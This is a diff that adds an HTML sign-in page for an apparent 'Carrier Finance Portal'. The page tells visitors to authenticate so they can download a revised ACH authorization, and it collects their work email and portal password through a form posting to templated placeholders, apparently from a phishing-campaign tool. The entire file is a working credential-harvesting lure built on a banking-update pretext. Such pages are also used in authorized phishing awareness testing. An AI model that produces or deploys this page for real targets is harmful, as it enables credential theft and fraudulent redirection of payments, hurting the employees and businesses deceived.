@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Carrier Finance Portal — Sign in</title>
+    <style>
+      body { margin: 0; font-family: 'Segoe UI', Calibri, Arial, sans-serif;
+             background: #f0f3f6; color: #1a1a1a; }
+      .hdr { background: #143b66; color: #fff; padding: 16px 24px;
+             font-size: 17px; font-weight: 600; letter-spacing: 0.2px; }
+      .panel { max-width: 420px; margin: 64px auto; background: #fff;
+               border: 1px solid #cfd5dc; padding: 30px; border-radius: 4px;
+               box-shadow: 0 1px 2px rgba(0,0,0,0.04); }
+      h2 { margin: 0 0 6px; font-size: 18px; color: #143b66; }
+      p.lead { font-size: 13px; color: #555; margin: 0 0 20px; }
+      label { display: block; font-size: 12px; color: #444; margin: 12px 0 4px; }
+      input { width: 100%; padding: 9px; box-sizing: border-box;
+              border: 1px solid #c0c6cd; border-radius: 3px; font-size: 14px; }
+      button { width: 100%; margin-top: 20px; padding: 11px;
+               background: #143b66; color: #fff; border: 0; border-radius: 3px;
+               font-size: 14px; cursor: pointer; }
+      .foot { font-size: 11px; color: #888; text-align: center; margin-top: 16px; }
+    </style>
+  </head>
+  <body>
+    <div class="hdr">Carrier Finance Portal</div>
+    <div class="panel">
+      <h2>Sign in to confirm banking update</h2>
+      <p class="lead">
+        Authentication is required to download the revised ACH authorization
+        and apply the update to your carrier record.
+      </p>
+      <form action="{{.URL}}" method="post" autocomplete="off">
+        <input type="hidden" name="rid" value="{{.RId}}">
+        <label for="email">Work email</label>
+        <input id="email" name="work_email" type="text">
+        <label for="pw">Portal password</label>
+        <input id="pw" name="portal_pw" type="password">
+        <button type="submit">Sign in</button>
+      </form>
+      <p class="foot">All access logged. Use your accounting team credentials.</p>
+    </div>
+  </body>
+</html>
